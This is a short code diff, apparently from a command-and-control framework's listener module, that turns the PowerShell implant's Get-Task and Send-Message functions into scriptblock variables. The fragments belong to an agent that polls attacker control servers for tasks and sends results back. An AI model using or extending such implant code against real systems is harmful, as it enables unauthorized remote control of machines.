@@ -356,7 +356,7 @@ class Listener:
                 """ % (listenerOptions['Host']['Value'])
 
                 getTask = """
-                    function script:Get-Task {
+                    $script:GetTask = {
 
                         try {
                             if ($Script:ControlServers[$Script:ServerIndex].StartsWith("http")) {
@@ -392,7 +392,7 @@ class Listener:
                 """
 
                 sendMessage = """
-                    function script:Send-Message {
+                    $script:SendMessage = {
                         param($Packets)
 
                         if($Packets) {
